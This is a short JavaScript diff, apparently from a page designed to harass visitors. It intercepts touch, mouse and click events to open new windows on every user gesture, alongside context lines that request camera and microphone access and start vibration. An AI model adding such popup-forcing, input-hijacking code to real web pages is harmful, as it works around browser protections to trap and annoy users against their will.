@@ -191,7 +191,10 @@ function init () {
       else requestCameraAndMic()
     }
 
-    openWindow()
+    // 'touchstart' and 'touchend' events are not able to open a new window
+    // (at least in Chrome), so don't even try. Checking `event.which` is a tricky
+    // way to detect these events.
+    if (event.which !== 0) openWindow()
   })
 }
 
@@ -341,6 +344,8 @@ function startVibrateInterval () {
  * Intercept all user-initiated events and call the given the function, `onInput`.
  */
 function interceptUserInput (onInput) {
+  document.body.addEventListener('touchstart', onInput, { passive: false })
+
   document.body.addEventListener('mousedown', onInput)
   document.body.addEventListener('mouseup', onInput)
   document.body.addEventListener('click', onInput)
